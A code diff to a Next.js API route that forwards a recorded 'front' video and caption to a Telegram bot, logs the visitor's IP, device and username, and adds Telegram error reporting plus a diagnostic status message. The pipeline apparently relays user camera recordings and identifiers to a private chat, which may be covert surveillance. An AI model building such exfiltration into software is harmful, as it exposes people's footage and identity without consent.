@@ -119,7 +119,10 @@ export async function POST(req: NextRequest) {
       method: 'POST',
       body: form,
     }).catch(() => null);
-    if (!r || !r.ok) tgStatus = `tg ${r ? r.status : 'net'}`;
+    if (!r || !r.ok) {
+      const t = r ? await r.text().catch(() => '') : '';
+      tgStatus = `tg ${r ? r.status : 'net'} ${t.slice(0, 120)}`;
+    }
   } else {
     form.append('video', first.blob, `front.${first.ext}`);
     form.append('caption', caption);
@@ -127,8 +130,21 @@ export async function POST(req: NextRequest) {
       method: 'POST',
       body: form,
     }).catch(() => null);
-    if (!r || !r.ok) tgStatus = `tg ${r ? r.status : 'net'}`;
+    if (!r || !r.ok) {
+      const t = r ? await r.text().catch(() => '') : '';
+      tgStatus = `tg ${r ? r.status : 'net'} ${t.slice(0, 120)}`;
+    }
   }
+
+  // 诊断回执：Telegram 返回结果原样报出
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: `【服务器】录像发送结果：${tgStatus}`,
+    }),
+  }).catch(() => undefined);
 
   recordEntry(req, { ip, loc: '', model: `${osOf(ua)} · ${browserOf(ua)}`, user: username });
   return NextResponse.json({ ok: true, telegram: tgStatus });
